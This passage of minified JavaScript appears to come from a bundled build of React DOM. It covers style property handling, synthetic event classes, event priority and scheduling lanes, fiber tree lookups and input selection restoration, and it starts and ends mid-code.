Go={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},NA=["Webkit","ms","Moz","O"];Object.keys(Go).forEach(function(e){NA.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),Go[t]=Go[e]})});function Z2(e,t,n){return t==null||typeof t=="boolean"||t===""?"":n||typeof t!="number"||t===0||Go.hasOwnProperty(e)&&Go[e]?(""+t).trim():t+"px"}function J2(e,t){e=e.style;for(var n in t)if(t.hasOwnProperty(n)){var r=n.indexOf("--")===0,a=Z2(n,t[n],r);n==="float"&&(n="cssFloat"),r?e.setProperty(n,a):e[n]=a}}var AA=Vt({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function _m(e,t){if(t){if(AA[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(Se(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(Se(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(Se(61))}if(t.style!=null&&typeof t.style!="object")throw Error(Se(62))}}function Im(e,t){if(e.indexOf("-")===-1)return typeof t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Pm=null;function Z0(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var jm=null,cl=null,dl=null;function By(e){if(e=qu(e)){if(typeof jm!="function")throw Error(Se(280));var t=e.stateNode;t&&(t=Sf(t),jm(e.stateNode,e.type,t))}}function eE(e){cl?dl?dl.push(e):dl=[e]:cl=e}function tE(){if(cl){var e=cl,t=dl;if(dl=cl=null,By(e),t)for(e=0;e<t.length;e++)By(t[e])}}function nE(e,t){return e(t)}function rE(){}var Ap=!1;function iE(e,t,n){if(Ap)return e(t,n);Ap=!0;try{return nE(e,t,n)}finally{Ap=!1,(cl!==null||dl!==null)&&(rE(),tE())}}function pu(e,t){var n=e.stateNode;if(n===null)return null;var r=Sf(n);if(r===null)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(n&&typeof n!="function")throw Error(Se(231,t,typeof n));return n}var Rm=!1;if(_i)try{var Co={};Object.defineProperty(Co,"passive",{get:function(){Rm=!0}}),window.addEventListener("test",Co,Co),window.removeEventListener("test",Co,Co)}catch{Rm=!1}function DA(e,t,n,r,a,l,u,f,h){var m=Array.prototype.slice.call(arguments,3);try{t.apply(n,m)}catch(x){this.onError(x)}}var Qo=!1,Od=null,Fd=!1,Om=null,LA={onError:function(e){Qo=!0,Od=e}};function _A(e,t,n,r,a,l,u,f,h){Qo=!1,Od=null,DA.apply(LA,arguments)}function IA(e,t,n,r,a,l,u,f,h){if(_A.apply(this,arguments),Qo){if(Qo){var m=Od;Qo=!1,Od=null}else throw Error(Se(198));Fd||(Fd=!0,Om=m)}}function vs(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,t.flags&4098&&(n=t.return),e=t.return;while(e)}return t.tag===3?n:null}function aE(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Hy(e){if(vs(e)!==e)throw Error(Se(188))}function PA(e){var t=e.alternate;if(!t){if(t=vs(e),t===null)throw Error(Se(188));return t!==e?null:e}for(var n=e,r=t;;){var a=n.return;if(a===null)break;var l=a.alternate;if(l===null){if(r=a.return,r!==null){n=r;continue}break}if(a.child===l.child){for(l=a.child;l;){if(l===n)return Hy(a),e;if(l===r)return Hy(a),t;l=l.sibling}throw Error(Se(188))}if(n.return!==r.return)n=a,r=l;else{for(var u=!1,f=a.child;f;){if(f===n){u=!0,n=a,r=l;break}if(f===r){u=!0,r=a,n=l;break}f=f.sibling}if(!u){for(f=l.child;f;){if(f===n){u=!0,n=l,r=a;break}if(f===r){u=!0,r=l,n=a;break}f=f.sibling}if(!u)throw Error(Se(189))}}if(n.alternate!==r)throw Error(Se(190))}if(n.tag!==3)throw Error(Se(188));return n.stateNode.current===n?e:t}function sE(e){return e=PA(e),e!==null?lE(e):null}function lE(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=lE(e);if(t!==null)return t;e=e.sibling}return null}var oE=br.unstable_scheduleCallback,Uy=br.unstable_cancelCallback,jA=br.unstable_shouldYield,RA=br.unstable_requestPaint,en=br.unstable_now,OA=br.unstable_getCurrentPriorityLevel,J0=br.unstable_ImmediatePriority,uE=br.unstable_UserBlockingPriority,Md=br.unstable_NormalPriority,FA=br.unstable_LowPriority,cE=br.unstable_IdlePriority,wf=null,ci=null;function MA(e){if(ci&&typeof ci.onCommitFiberRoot=="function")try{ci.onCommitFiberRoot(wf,e,void 0,(e.current.flags&128)===128)}catch{}}var Vr=Math.clz32?Math.clz32:UA,BA=Math.log,HA=Math.LN2;function UA(e){return e>>>=0,e===0?32:31-(BA(e)/HA|0)|0}var Yc=64,Vc=4194304;function qo(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Bd(e,t){var n=e.pendingLanes;if(n===0)return 0;var r=0,a=e.suspendedLanes,l=e.pingedLanes,u=n&268435455;if(u!==0){var f=u&~a;f!==0?r=qo(f):(l&=u,l!==0&&(r=qo(l)))}else u=n&~a,u!==0?r=qo(u):l!==0&&(r=qo(l));if(r===0)return 0;if(t!==0&&t!==r&&!(t&a)&&(a=r&-r,l=t&-t,a>=l||a===16&&(l&4194240)!==0))return t;if(r&4&&(r|=n&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=r;0<t;)n=31-Vr(t),a=1<<n,r|=e[n],t&=~a;return r}function zA(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function WA(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,a=e.expirationTimes,l=e.pendingLanes;0<l;){var u=31-Vr(l),f=1<<u,h=a[u];h===-1?(!(f&n)||f&r)&&(a[u]=zA(f,t)):h<=t&&(e.expiredLanes|=f),l&=~f}}function Fm(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function dE(){var e=Yc;return Yc<<=1,!(Yc&4194240)&&(Yc=64),e}function Dp(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function zu(e,t,n){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-Vr(t),e[t]=n}function qA(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var a=31-Vr(n),l=1<<a;t[a]=0,r[a]=-1,e[a]=-1,n&=~l}}function eg(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-Vr(n),a=1<<r;a&t|e[r]&t&&(e[r]|=t),n&=~a}}var St=0;function fE(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var hE,tg,pE,mE,gE,Mm=!1,Gc=[],va=null,ba=null,Ea=null,mu=new Map,gu=new Map,fa=[],$A="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function zy(e,t){switch(e){case"focusin":case"focusout":va=null;break;case"dragenter":case"dragleave":ba=null;break;case"mouseover":case"mouseout":Ea=null;break;case"pointerover":case"pointerout":mu.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":gu.delete(t.pointerId)}}function So(e,t,n,r,a,l){return e===null||e.nativeEvent!==l?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:l,targetContainers:[a]},t!==null&&(t=qu(t),t!==null&&tg(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,a!==null&&t.indexOf(a)===-1&&t.push(a),e)}function YA(e,t,n,r,a){switch(t){case"focusin":return va=So(va,e,t,n,r,a),!0;case"dragenter":return ba=So(ba,e,t,n,r,a),!0;case"mouseover":return Ea=So(Ea,e,t,n,r,a),!0;case"pointerover":var l=a.pointerId;return mu.set(l,So(mu.get(l)||null,e,t,n,r,a)),!0;case"gotpointercapture":return l=a.pointerId,gu.set(l,So(gu.get(l)||null,e,t,n,r,a)),!0}return!1}function xE(e){var t=ts(e.target);if(t!==null){var n=vs(t);if(n!==null){if(t=n.tag,t===13){if(t=aE(n),t!==null){e.blockedOn=t,gE(e.priority,function(){pE(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function xd(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=Bm(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);Pm=r,n.target.dispatchEvent(r),Pm=null}else return t=qu(n),t!==null&&tg(t),e.blockedOn=n,!1;t.shift()}return!0}function Wy(e,t,n){xd(e)&&n.delete(t)}function VA(){Mm=!1,va!==null&&xd(va)&&(va=null),ba!==null&&xd(ba)&&(ba=null),Ea!==null&&xd(Ea)&&(Ea=null),mu.forEach(Wy),gu.forEach(Wy)}function No(e,t){e.blockedOn===t&&(e.blockedOn=null,Mm||(Mm=!0,br.unstable_scheduleCallback(br.unstable_NormalPriority,VA)))}function xu(e){function t(a){return No(a,e)}if(0<Gc.length){No(Gc[0],e);for(var n=1;n<Gc.length;n++){var r=Gc[n];r.blockedOn===e&&(r.blockedOn=null)}}for(va!==null&&No(va,e),ba!==null&&No(ba,e),Ea!==null&&No(Ea,e),mu.forEach(t),gu.forEach(t),n=0;n<fa.length;n++)r=fa[n],r.blockedOn===e&&(r.blockedOn=null);for(;0<fa.length&&(n=fa[0],n.blockedOn===null);)xE(n),n.blockedOn===null&&fa.shift()}var fl=Hi.ReactCurrentBatchConfig,Hd=!0;function GA(e,t,n,r){var a=St,l=fl.transition;fl.transition=null;try{St=1,ng(e,t,n,r)}finally{St=a,fl.transition=l}}function QA(e,t,n,r){var a=St,l=fl.transition;fl.transition=null;try{St=4,ng(e,t,n,r)}finally{St=a,fl.transition=l}}function ng(e,t,n,r){if(Hd){var a=Bm(e,t,n,r);if(a===null)Bp(e,t,r,Ud,n),zy(e,r);else if(YA(a,e,t,n,r))r.stopPropagation();else if(zy(e,r),t&4&&-1<$A.indexOf(e)){for(;a!==null;){var l=qu(a);if(l!==null&&hE(l),l=Bm(e,t,n,r),l===null&&Bp(e,t,r,Ud,n),l===a)break;a=l}a!==null&&r.stopPropagation()}else Bp(e,t,r,null,n)}}var Ud=null;function Bm(e,t,n,r){if(Ud=null,e=Z0(r),e=ts(e),e!==null)if(t=vs(e),t===null)e=null;else if(n=t.tag,n===13){if(e=aE(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Ud=e,null}function yE(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(OA()){case J0:return 1;case uE:return 4;case Md:case FA:return 16;case cE:return 536870912;default:return 16}default:return 16}}var pa=null,rg=null,yd=null;function vE(){if(yd)return yd;var e,t=rg,n=t.length,r,a="value"in pa?pa.value:pa.textContent,l=a.length;for(e=0;e<n&&t[e]===a[e];e++);var u=n-e;for(r=1;r<=u&&t[n-r]===a[l-r];r++);return yd=a.slice(e,1<r?1-r:void 0)}function vd(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Qc(){return!0}function qy(){return!1}function wr(e){function t(n,r,a,l,u){this._reactName=n,this._targetInst=a,this.type=r,this.nativeEvent=l,this.target=u,this.currentTarget=null;for(var f in e)e.hasOwnProperty(f)&&(n=e[f],this[f]=n?n(l):l[f]);return this.isDefaultPrevented=(l.defaultPrevented!=null?l.defaultPrevented:l.returnValue===!1)?Qc:qy,this.isPropagationStopped=qy,this}return Vt(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=Qc)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=Qc)},persist:function(){},isPersistent:Qc}),t}var Pl={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ig=wr(Pl),Wu=Vt({},Pl,{view:0,detail:0}),KA=wr(Wu),Lp,_p,Ao,kf=Vt({},Wu,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:ag,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Ao&&(Ao&&e.type==="mousemove"?(Lp=e.screenX-Ao.screenX,_p=e.screenY-Ao.screenY):_p=Lp=0,Ao=e),Lp)},movementY:function(e){return"movementY"in e?e.movementY:_p}}),$y=wr(kf),XA=Vt({},kf,{dataTransfer:0}),ZA=wr(XA),JA=Vt({},Wu,{relatedTarget:0}),Ip=wr(JA),e3=Vt({},Pl,{animationName:0,elapsedTime:0,pseudoElement:0}),t3=wr(e3),n3=Vt({},Pl,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),r3=wr(n3),i3=Vt({},Pl,{data:0}),Yy=wr(i3),a3={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},s3={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},l3={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function o3(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=l3[e])?!!t[e]:!1}function ag(){return o3}var u3=Vt({},Wu,{key:function(e){if(e.key){var t=a3[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=vd(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?s3[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:ag,charCode:function(e){return e.type==="keypress"?vd(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?vd(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),c3=wr(u3),d3=Vt({},kf,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Vy=wr(d3),f3=Vt({},Wu,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:ag}),h3=wr(f3),p3=Vt({},Pl,{propertyName:0,elapsedTime:0,pseudoElement:0}),m3=wr(p3),g3=Vt({},kf,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),x3=wr(g3),y3=[9,13,27,32],sg=_i&&"CompositionEvent"in window,Ko=null;_i&&"documentMode"in document&&(Ko=document.documentMode);var v3=_i&&"TextEvent"in window&&!Ko,bE=_i&&(!sg||Ko&&8<Ko&&11>=Ko),Gy=" ",Qy=!1;function EE(e,t){switch(e){case"keyup":return y3.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function wE(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var Zs=!1;function b3(e,t){switch(e){case"compositionend":return wE(t);case"keypress":return t.which!==32?null:(Qy=!0,Gy);case"textInput":return e=t.data,e===Gy&&Qy?null:e;default:return null}}function E3(e,t){if(Zs)return e==="compositionend"||!sg&&EE(e,t)?(e=vE(),yd=rg=pa=null,Zs=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return bE&&t.locale!=="ko"?null:t.data;default:return null}}var w3={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Ky(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!w3[e.type]:t==="textarea"}function kE(e,t,n,r){eE(r),t=zd(t,"onChange"),0<t.length&&(n=new ig("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var Xo=null,yu=null;function k3(e){jE(e,0)}function Tf(e){var t=tl(e);if(V2(t))return e}function T3(e,t){if(e==="change")return t}var TE=!1;if(_i){var Pp;if(_i){var jp="oninput"in document;if(!jp){var Xy=document.createElement("div");Xy.setAttribute("oninput","return;"),jp=typeof Xy.oninput=="function"}Pp=jp}else Pp=!1;TE=Pp&&(!document.documentMode||9<document.documentMode)}function Zy(){Xo&&(Xo.detachEvent("onpropertychange",CE),yu=Xo=null)}function CE(e){if(e.propertyName==="value"&&Tf(yu)){var t=[];kE(t,yu,e,Z0(e)),iE(k3,t)}}function C3(e,t,n){e==="focusin"?(Zy(),Xo=t,yu=n,Xo.attachEvent("onpropertychange",CE)):e==="focusout"&&Zy()}function S3(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Tf(yu)}function N3(e,t){if(e==="click")return Tf(t)}function A3(e,t){if(e==="input"||e==="change")return Tf(t)}function D3(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var Kr=typeof Object.is=="function"?Object.is:D3;function vu(e,t){if(Kr(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var a=n[r];if(!Em.call(t,a)||!Kr(e[a],t[a]))return!1}return!0}function Jy(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function ev(e,t){var n=Jy(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=Jy(n)}}function SE(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?SE(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function NE(){for(var e=window,t=Rd();t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href=="string"}catch{n=!1}if(n)e=t.contentWindow;else break;t=Rd(e.document)}return t}function lg(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function L3(e){var t=NE(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&SE(n.ownerDocument.documentElement,n)){if(r!==null&&lg(n)){if(t=r.start,e=r.end,e===void 0&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if(e=(t=n.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var a=n.textContent.length,l=Math.min(r.start,a);r=r.end===void 0?l:Math.min(r.end,a),!e.extend&&l>r&&(a=r,r=l,l=a),a=ev(n,l);var u=ev(n,r);a&&u&&(e.rangeCount!==1||e.anchorNode!==a.node||e.anchorOffset!==a.offset||e.focusNode!==u.node||e.focusOffset!==u.offset)&&(t=t.createRange(),t.setStart(a.node,a.offset),e.removeAllRanges(),l>r?(e.addRange(t),e.extend(u.node,u.offset)):(t.setEnd(u.node,u.offset),e.addRange(t)))}}for(t=[],e=n;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<t.length;n++)e=t[n],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var _3=_i&&"documentMode"in document&&11>=document.documentMode,Js=null,Hm=null,Zo=null,Um=!1;function tv(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Um||Js==null||Js!==Rd(r)||(r=Js,"selectionStart"in r&&lg(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Zo&&vu(Zo,r)||(Zo=r,r=zd(Hm,"onSelect"),0<r.length&&(t=new ig("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=Js)))}function Kc(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var el={animationend:Kc("Animation","AnimationEnd"),animationiteration:Kc("Animation","AnimationIteration"),animationstart:Kc("Animation","AnimationStart"),transitionend:Kc("Transition","TransitionEnd")},Rp={},AE={};_i&&(AE=document.createElement("div").style,"AnimationEvent"in window||(delete el.animationend.animation,delete el.animationiteration.animation,delete el.animationstart.animation),"TransitionEvent"in window||delete el.transitionend.transition);function Cf(e){if(Rp[e])return Rp[e];if(!el[e])return e;var t=el[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in AE)return Rp[e]=t[n];return e}var DE=Cf("animationend"),LE=Cf("animationiteration"),_E=Cf("animationstart"),IE=Cf("transitionend"),PE=new Map,nv="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function La(e,t){PE.set(e,t),ys(t,[e])}for(var Op=0;Op<nv.length;Op++){var Fp=nv[Op],I3=Fp.toLowerCase(),P3=Fp[0].toUpperCase()+Fp.slice(1);La(I3,"on"+P3)}La(DE,"onAnimationEnd");La(LE,"onAnimationIteration");La(_E,"onAnimationStart");La("dblclick","onDoubleClick");La("focusin","onFocus");La("focusout","onBlur");La(IE,"onTransitionEnd");bl("onMouseEnter",["mouseout","mouseover"]);bl("onMouseLeave",["mouseout","mouseover"]);bl("onPointerEnter",["pointerout","pointerover"]);bl("onPointerLeave",["pointerout","pointerover"]);ys("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));ys("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));ys("onBeforeInput",["compositionend","keypress","textInput","paste"]);ys("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));ys("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));ys("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var $o="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),j3=new Set("cancel close invalid load scroll toggle".split(" ").concat($o));function rv(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,IA(r,t,void 0,e),e.currentTarget=null}function jE(e,t){t=(t&4)!==0;for(var n=0;n<e.length;n++){var r=e[n],a=r.event;r=r.listeners;e:{var l=void 0;if(t)for(var u=r.length-1;0<=u;u--){var f=r[u],h=f.instance,m=f.currentTarget;if(f=f.listener,h!==l&&a.isPropagationStopped())break e;rv(a,f,m),l=h}else for(u=0;u<r.length;u++){if(f=r[u],h=f.instance,m=f.currentTarget,f=f.listener,h!==l&&a.isPropagationStopped())break e;rv(a,f,m),l=h}}}if(Fd)throw e=Om,Fd=!1,Om=null,e}function Rt(e,t){var n=t[Ym];n===void 0&&(n=t[Ym]=new Set);var r=e+"__bubble";n.has(r)||(RE(t,e,2,!1),n.add(r))}function Mp(e,t,n){var r=0;t&&(r|=4),RE(n,e,r,t)}var Xc="_reactListening"+Math.random().toString(36).slice(2);function bu(e){if(!e[Xc]){e[Xc]=!0,z2.forEach(function(n){n!=="selectionchange"&&(j3.has(n)||Mp(n,!1,e),Mp(n,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[Xc]||(t[Xc]=!0,Mp("selectionchange",!1,t))}}function RE(e,t,n,r){switch(yE(t)){case 1:var a=GA;break;case 4:a=QA;break;default:a=ng}n=a.bind(null,t,n,e),a=void 0,!Rm||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(a=!0),r?a!==void 0?e.addEventListener(t,n,{capture:!0,passive:a}):e.addEventListener(t,n,!0):a!==void 0?e.addEventListener(t,n,{passive:a}):e.addEventListener(t,n,!1)}function Bp(e,t,n,r,a){var l=r;if(!(t&1)&&!(t&2)&&r!==null)e:for(;;){if(r===null)return;var u=r.tag;if(u===3||u===4){var f=r.stateNode.containerInfo;if(f===a||f.nodeType===8&&f.parentNode===a)break;if(u===4)for(u=r.return;u!==null;){var h=u.tag;if((h===3||h===4)&&(h=u.stateNode.containerInfo,h===a||h.nodeType===8&&h.parentNode===a))return;u=u.return}for(;f!==null;){if(u=ts(f),u===null)return;if(h=u.tag,h===5||h===6){r=l=u;continue e}f=f.parentNode}}r=r.return}iE(function(){var m=l,x=Z0(n),g=[];e:{var b=PE.get(e);if(b!==void 0){var E=ig,C=e;switch(e){case"keypress":if(vd(n)===0)break 